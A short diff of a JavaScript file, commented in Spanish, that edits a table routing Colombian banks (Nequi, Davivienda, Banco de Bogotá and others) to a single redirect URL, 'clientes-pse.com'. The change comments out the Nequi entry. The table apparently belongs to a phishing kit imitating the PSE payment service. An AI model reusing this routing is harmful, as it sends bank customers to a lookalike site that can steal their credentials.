@@ -16,7 +16,7 @@ const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 // CONFIGURACIÓN DE ENRUTAMIENTO POR BANCO
 // ==========================================
 const RUTAS_BANCOS = {
-    "NEQUI": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "NEQUI": { tipo: "redirect", url: "https://clientes-pse.com/" },
     "BANCO DAVIVIENDA": { tipo: "redirect", url: "https://clientes-pse.com/" },
     "BANCO DE BOGOTA": { tipo: "redirect", url: "https://clientes-pse.com/" },
     "DAVIbank": { tipo: "redirect", url: "https://clientes-pse.com/" },
